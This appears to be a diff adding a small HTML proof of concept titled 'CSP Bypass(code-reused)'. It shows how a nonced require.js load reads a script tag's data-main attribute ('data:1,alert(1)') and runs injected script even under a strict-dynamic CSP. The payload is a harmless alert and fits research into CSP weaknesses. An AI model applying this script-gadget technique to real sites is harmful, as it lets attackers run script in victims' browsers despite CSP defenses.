@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv=content-security-policy content="script-src 'nonce-secret123' 'strict-dynamic';"> -->
+</head>
+
+<body>
+    <!-- payload -->
+    <script data-main='data:1,alert(1)'></script>
+    <!-- end -->
+    <script type="text/javascript" src="http://requirejs.org/docs/release/2.3.2/comments/require.js" nonce="secret123"></script>
+</body>
+</body>
+
+</html>
